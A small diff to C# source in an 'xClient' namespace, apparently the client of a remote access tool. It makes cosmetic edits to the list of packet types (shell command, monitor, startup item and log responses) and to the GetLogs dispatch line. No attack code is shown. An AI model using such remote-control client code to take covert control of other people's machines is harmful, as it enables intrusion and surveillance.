@@ -98,7 +98,7 @@ namespace xClient
                 typeof (Core.Packets.ClientPackets.MonitorsResponse),
                 typeof (Core.Packets.ClientPackets.ShellCommandResponse),
                 typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
-                typeof (Core.Packets.ClientPackets.GetLogsResponse)
+                typeof (Core.Packets.ClientPackets.GetLogsResponse),
             });
 
             ConnectClient.ClientState += ClientState;
@@ -330,7 +330,7 @@ namespace xClient
             }
             else if (type == typeof(Core.Packets.ServerPackets.GetLogs))
             {
-                CommandHandler.HandleGetLogs((Core.Packets.ServerPackets.GetLogs) packet, client);
+                CommandHandler.HandleGetLogs((Core.Packets.ServerPackets.GetLogs)packet, client);
             }
         }
     }
